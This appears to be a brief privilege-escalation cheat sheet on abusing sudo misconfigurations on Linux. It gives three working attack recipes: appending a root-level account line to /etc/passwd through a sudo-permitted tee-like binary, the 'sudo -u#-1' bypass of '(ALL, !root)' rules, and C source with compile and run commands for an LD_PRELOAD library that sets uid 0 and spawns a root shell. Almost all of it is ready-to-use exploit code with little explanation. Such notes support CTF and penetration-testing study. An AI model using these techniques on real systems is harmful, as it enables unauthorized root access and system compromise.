# Sudo 
------

teehee (sudo -l)
-a appends everything to the specified file.
```bash
$ sudo /usr/bin/teehee -a /etc/passwd
noob:$5$cbbncbbn$NR5AzrW84BY0BI0ok8kckJpg9RL8YFoI6LjOjQLip2B:0:0:root:/root:/bin/bash
```

not root on sudo -l :
```bash
(ALL, !root) /bin/bash

sudo -u#-1 /bin/bash
```


### LD_PRELOAD:
While running sudo -l if we find:
```bash
env_keep+=LD_PRELOAD
```

The user will need sudo access to run some command.

```C
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/sh");  
}
```

Compile the code:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Execute LD_PRELOAD along with the sudo permissions:
```bash
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

-----
